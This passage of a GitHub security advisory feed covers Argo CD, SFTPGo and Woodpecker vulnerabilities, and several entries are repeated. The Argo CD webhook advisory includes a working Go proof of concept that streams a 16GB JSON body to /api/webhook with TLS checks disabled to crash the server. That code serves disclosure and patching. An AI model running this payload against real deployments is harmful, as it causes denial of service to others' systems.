            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-24T20:54:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly]]></title>
        <id>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</id>
        <link href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"/>
        <updated>2024-07-24T20:54:03.000Z</updated>
        <content type="html"><![CDATA[<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>
<h2 id="description">Description</h2>
<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.7
v2.10.16
v2.9.21</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by 
Shengjie Li, Huazhong University of Science and Technology
Zhi Li, Huazhong University of Science and Technology
Weijie Liu, Nankai University</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41666">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>
<li><a href="https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>
<li><a href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-24T20:54:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] The Argo CD web terminal session does not handle the revocation of user permissions properly]]></title>
        <id>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</id>
        <link href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw"/>
        <updated>2024-07-24T20:54:03.000Z</updated>
        <content type="html"><![CDATA[<p>Argo CD v2.11.3 and before, discovering that even if the user's <code>p, role:myrole, exec, create, */*, allow</code> permissions are revoked, the user can still send any Websocket message, which allows the user to view sensitive information. Even though they shouldn't have such access.</p>
<h2 id="description">Description</h2>
<p>Argo CD has a Web-based terminal that allows you to get a shell inside a running pod, just like you would with kubectl exec. However, when the administrator enables this function and grants permission to the user <code>p, role:myrole, exec, create, */*, allow</code>, even if the user revokes this permission, the user can still perform operations in the container, as long as the user keeps the terminal view open for a long time. CVE-2023-40025 Although the token expiration and revocation of the user are fixed, however, the fix does not address the situation of revocation of only user <code>p, role:myrole, exec, create, */*, allow</code> permissions, which may still lead to the leakage of sensitive information.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.7
v2.10.16
v2.9.21</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by 
Shengjie Li, Huazhong University of Science and Technology
Zhi Li, Huazhong University of Science and Technology
Weijie Liu, Nankai University</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/argoproj/argo-cd/security/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41666">https://nvd.nist.gov/vuln/detail/CVE-2024-41666</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476">https://github.com/argoproj/argo-cd/commit/05edb2a9ca48f0f10608c1b49fbb0cf7164f6476</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6">https://github.com/argoproj/argo-cd/commit/e96f32d233504101ddac028a5bf8117433d333d6</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4">https://github.com/argoproj/argo-cd/commit/ef535230d8bd8ad7b18aab1ea1063e9751d348c4</a></li>
<li><a href="https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing">https://drive.google.com/file/d/1Fynj5Sho8Lf8CETqsNXZyPKlTDdmgJuN/view?usp=sharing</a></li>
<li><a href="https://github.com/advisories/GHSA-v8wx-v5jq-qhhw">https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8wx-v5jq-qhhw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-24T20:54:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/drakkan/sftpgo/v2] SFTPGo's JWT implmentation lacks certain security measures]]></title>
        <id>https://github.com/advisories/GHSA-x72p-g37q-4xr9</id>
        <link href="https://github.com/advisories/GHSA-x72p-g37q-4xr9"/>
        <updated>2024-07-26T21:37:18.000Z</updated>
        <content type="html"><![CDATA[<p>In SFTPGo 2.6.2, the JWT implementation lacks certain security measures, such as using JWT ID (JTI) claims, nonces, and proper expiration and invalidation mechanisms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40430">https://nvd.nist.gov/vuln/detail/CVE-2024-40430</a></li>
<li><a href="https://alexsecurity.rocks/posts/cve-2024-40430">https://alexsecurity.rocks/posts/cve-2024-40430</a></li>
<li><a href="https://github.com/advisories/GHSA-x72p-g37q-4xr9">https://github.com/advisories/GHSA-x72p-g37q-4xr9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x72p-g37q-4xr9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T09:31:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable]]></title>
        <id>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</id>
        <link href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm"/>
        <updated>2024-07-22T13:18:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront</strong></p>
<h3 id="references">References</h3>
<ul>
